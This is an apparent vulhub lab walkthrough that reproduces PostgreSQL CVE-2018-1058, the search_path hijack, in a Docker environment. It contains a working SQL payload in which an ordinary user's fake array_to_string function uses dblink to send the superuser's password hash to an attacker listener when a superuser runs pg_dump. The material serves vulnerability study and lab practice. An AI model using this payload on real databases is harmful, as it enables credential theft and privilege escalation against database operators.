# PostgreSQL Elevation of Effort (CVE-2018-1058)

PostgreSQL is a relational database. There is a logic error in the 9.3 to 10 version that causes the superuser to unscrupulously trigger malicious code created by ordinary users, causing some unpredictable operations.

Reference link:

- https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
- https://xianzhi.aliyun.com/forum/topic/2109

## vulnerability environment

Start a vulnerable environment:

```
Docker-compose up -d
```

After the environment is started, the default 543 port of the PG will be enabled locally.

## Vulnerability recurrence

Referring to the second use of the above link, we first log in to postgres as the normal user `vulhub:vulhub`: `psql --host your-ip --username vulhub`

![](1.png)

Execute after executing the following statement:

```
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    Select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres')));
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
```

Then I listened to port 5433 on `10.0.0.1` and waited for the superuser to trigger the "back door" we left.

(Pretend to be a superuser) Under the shooting range machine, execute the `pg_dump` command as the superuser: `docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub` to export the contents of the vulhub database.

While executing the above command, the "back door" has been triggered, and the sensitive information has been received on the `10.0.0.1` machine:

![](2.png)

The above process is only a way to use the vulnerability. It may be a bit messy when it comes to machines. It is recommended that readers read the articles in the reference link to get more usage.